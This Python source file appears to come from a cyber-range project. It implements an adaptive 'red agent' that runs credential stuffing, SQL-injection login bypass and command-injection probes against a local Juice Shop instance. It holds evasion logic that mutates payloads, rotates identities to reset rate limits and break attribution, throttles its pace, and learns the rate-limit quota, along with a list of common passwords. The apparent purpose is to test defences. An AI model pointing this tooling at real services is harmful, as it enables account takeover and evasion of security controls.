"""Adaptive red agent: observes whether it was blocked and changes technique.

Local range only (http://localhost:8080), bounded request budget, no other host. This is the
M4 "red agent" in its simplest honest form: a fixed ladder of evasions, driven only by what
the attacker can actually observe (HTTP status of its own requests), not by any knowledge of
the defence's internals.

    after `patience` consecutive blocks it adapts, cycling through the ladder for its goal:
      mutate    re-encode / re-case / comment-pad the payload (range/mutate/mutate.py)
      rotate    throw away its identity (new visitor cookie + cookie jar): resets any
                per-actor counter and breaks attribution that keys on the identifier
      slow      double the delay between requests (slow-and-low), up to a cap
    and it LEARNS the rate limit: the number of requests that got through on one identity
    before the first 429 becomes its per-identity quota, after which it rotates proactively.

Goals:  credential_stuffing | sqli | command_injection
  credential_stuffing  objective = harvest valid credential pairs from one shuffled pass over a
                       ~80-pair guess list (the 3 valid pairs of the range are hidden in it)
  sqli                 objective = authentication bypass via SQL injection login
  command_injection    Juice Shop has no OS-command sink, so there is no objective to meet;
                       what is measured is EVASION: payload requests that reach the app.

Ground-truth labelling for scoring is the visitor cookie `atk-<goal>-<n>` (the gateway turns it
into gt_label=attack:<goal>); the agent's own behaviour never depends on it.
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(ROOT / "range" / "mutate"))
import campaigns as C            # noqa: E402
from client import Actor        # noqa: E402
from mutate import MUTATORS     # noqa: E402

LADDER = {
    "credential_stuffing": ["rotate", "slow"],
    "sqli": ["mutate", "rotate", "slow"],
    "command_injection": ["mutate", "rotate", "slow"],
}
MAX_PACE = 20.0


@dataclass
class Report:
    goal: str
    budget: int
    requests: int = 0
    blocked: int = 0
    passed: int = 0                       # attack-payload requests that were NOT blocked
    first_block_at: int | None = None     # request number of the first block
    objective_met: bool = False
    requests_to_objective: int | None = None   # requests until the FIRST success
    valid_found: list = field(default_factory=list)    # stuffing: every valid pair harvested
    adaptations: dict = field(default_factory=lambda: {"mutate": 0, "rotate": 0, "slow": 0})
    identities: int = 1
    learned_quota: int | None = None
    mutators_tried: list = field(default_factory=list)
    final_pace: float = 0.0
    seconds: float = 0.0
    timeline: list = field(default_factory=list)   # (request no., event) for adaptations


class RedAgent:
    def __init__(self, goal: str, budget: int = 400, pace: float = 0.3, patience: int = 2,
                 base: str = "http://localhost:8080", log: Path | None = None, seed: int = 1):
        assert goal in LADDER, goal
        self.goal, self.budget, self.pace0, self.patience = goal, budget, pace, patience
        self.base, self.rng = base, random.Random(seed)
        self.pace = pace
        self.rep = Report(goal=goal, budget=budget, final_pace=pace)
        self.mut_ix = 0
        self.ladder_ix = 0
        self.consec = 0
        self.passes_this_id = 0
        self.sink = None
        if log:
            log.parent.mkdir(parents=True, exist_ok=True)
            self.sink = log.open("a", encoding="utf-8")
        self._new_identity(first=True)

    # --- identity -------------------------------------------------------------------
    def _new_identity(self, first: bool = False) -> None:
        self.actor = Actor(base=self.base, campaign=self.goal, attack_class=self.goal,
                           user_agent=C.user_agent_for(self.goal), out=self.sink)
        self.passes_this_id = 0
        if not first:
            self.rep.identities += 1

    # --- payload stream ----------------------------------------------------------------
    def _payloads(self):
        if self.goal == "credential_stuffing":
            emails = list(dict.fromkeys(e for e, _ in C.CRED_LIST))
            pws = ["123456", "password", "qwerty", "letmein", "welcome", "iloveyou",
                   "abc123", "monkey", "dragon", "football", "sunshine", "master"]
            pairs = list(dict.fromkeys(list(C.CRED_LIST) + [(e, p) for e in emails for p in pws]))
            self.rng.shuffle(pairs)
            yield from pairs                       # ONE pass: no re-trying the same guess
        elif self.goal == "sqli":
            while True:
                for p in C.SQLI_LOGIN:
                    yield p
        else:
            while True:
                for p in C.CMDI:
                    yield p

    def _mutate(self, s: str) -> str:
        names = list(MUTATORS)
        return MUTATORS[names[self.mut_ix % len(names)]](s)

    # --- one attempt -------------------------------------------------------------------
    def _attempt(self, payload):
        a = self.actor
        if self.goal == "credential_stuffing":
            email, pw = payload
            r = a.fire("POST", "/rest/user/login", stage="exploit", technique="adaptive-stuffing",
                       json_body={"email": email, "password": pw})
            ok = r.status == 200 and "authentication" in r.body.lower()
        elif self.goal == "sqli":
            r = a.fire("POST", "/rest/user/login", stage="exploit", technique="adaptive-sqli",
                       json_body={"email": self._mutate(payload), "password": "x"})
            ok = r.status == 200 and "authentication" in r.body.lower()
        else:
            r = a.fire("GET", "/rest/products/search", stage="probe", technique="adaptive-cmdi",
                       params={"q": "apple" + self._mutate(payload)})
            ok = False        # no sink; evasion is counted via `passed`
        return r, ok

    # --- adaptation ----------------------------------------------------------------------
    def _adapt(self) -> None:
        ladder = LADDER[self.goal]
        step = ladder[self.ladder_ix % len(ladder)]
        self.ladder_ix += 1
        n = self.rep.requests
        if step == "mutate":
            self.mut_ix += 1
            name = list(MUTATORS)[self.mut_ix % len(MUTATORS)]
            self.rep.mutators_tried.append(name)
            self.rep.timeline.append((n, f"mutate->{name}"))
        elif step == "rotate":
            self._new_identity()
            self.rep.timeline.append((n, "rotate identity"))
        else:
            self.pace = min(MAX_PACE, self.pace * 2)
            self.rep.timeline.append((n, f"slow->{self.pace:.1f}s"))
        self.rep.adaptations[step] += 1
        self.consec = 0

    def run(self) -> Report:
        t0 = time.time()
        gen = self._payloads()
        rep = self.rep
        while rep.requests < self.budget:
            payload = next(gen, None)
            if payload is None:              # guess list exhausted
                break
            r, ok = self._attempt(payload)
            rep.requests += 1
            if r.blocked:
                rep.blocked += 1
                self.consec += 1
                if rep.first_block_at is None:
                    rep.first_block_at = rep.requests
                if r.status == 429 and rep.learned_quota is None and self.passes_this_id > 0:
                    rep.learned_quota = self.passes_this_id       # observed per-identity quota
            else:
                rep.passed += 1
                self.consec = 0
                self.passes_this_id += 1
            if ok:
                if not rep.objective_met:
                    rep.objective_met, rep.requests_to_objective = True, rep.requests
                if self.goal == "credential_stuffing":
                    rep.valid_found.append(payload[0])
                else:
                    break
            if self.consec >= self.patience:
                self._adapt()
            elif (rep.learned_quota and self.passes_this_id >= max(1, rep.learned_quota - 1)):
                # proactive: leave before the limiter fires again
                self._new_identity()
                rep.adaptations["rotate"] += 1
                rep.timeline.append((rep.requests, "proactive rotate"))
            time.sleep(self.pace * (0.5 + self.rng.random()))
        rep.final_pace = self.pace
        rep.seconds = round(time.time() - t0, 1)
        if self.sink:
            self.sink.close()
        return rep


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("goal", choices=list(LADDER))
    ap.add_argument("--budget", type=int, default=400)
    ap.add_argument("--pace", type=float, default=0.3)
    ap.add_argument("--seed", type=int, default=1)
    ap.add_argument("--log", type=Path, default=ROOT / "logs" / "attacks" / "adaptive.jsonl")
    a = ap.parse_args()
    rep = RedAgent(a.goal, a.budget, a.pace, seed=a.seed, log=a.log).run()
    print(json.dumps(rep.__dict__, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
